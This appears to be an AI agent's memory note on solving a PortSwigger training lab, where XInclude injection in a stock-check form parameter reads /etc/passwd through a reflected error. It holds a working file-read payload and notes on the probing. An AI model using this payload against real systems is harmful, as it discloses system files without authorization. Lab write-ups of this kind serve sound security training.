---
metadata:
  node_type: memory
name: "Lab Targeted Scanning XInclude file read"
description: "Stock check XML-parses form values; DOCTYPE/XXE blocked, XInclude in productId reads /etc/passwd in-band via the reflected error"
last_updated: 2026-10-11T17:26:31+08:00
created: 2026-10-11T17:26:31+08:00
---

Lab: portswigger essential-skills "Discovering vulnerabilities quickly with targeted scanning" (10-minute timer, read /etc/passwd).

App surface (minimal): `/`, `/product?productId=N`, `/product/stock` (POST, urlencoded), `/image/productcatalog/products/N.jpg`, `/analytics`, `/resources/*`. No hidden routes (78-path fuzz found none).

Behaviour that cracks it:
- `POST /product/stock` reads only urlencoded form params (any non-form body, incl. Content-Type application/xml with a real XML body, returns the generic 400 "No such product or store").
- productId must be an integer AFTER the value is XML-parsed: productId=<x>1</x> returns the same stock number as productId=1. <1>2</1> (invalid tag name) fails -> values really are XML-parsed, not tag-stripped.
- Invalid productId is reflected: "Invalid product ID: <extracted text>".
- DOCTYPE/XXE is NOT usable (the value is embedded in a larger document, so an injected DOCTYPE breaks the parse -> generic error). No OOB needed.
- XInclude IS enabled: productId=<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></x> inlines the file, which then fails the int check and is reflected in the 400 body -> full /etc/passwd in-band.

Key payload (urlencoded form):
productId=<x xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></x>&storeId=1

Notes:
- storeId is XML-parsed the same way but has no reflection; productId is the leak.
- 10-minute timer: expired instance answers everything with a 3100-byte "Time's up!" page; GET /try-again returns 302 to / and resets it (404 when the timer has not expired).
- Traps that cost time: raw_http POST needs an explicit Content-Length or the body is dropped; burp_interp recomputes Content-Length with --set-body and sends a trustworthy single Content-Type.
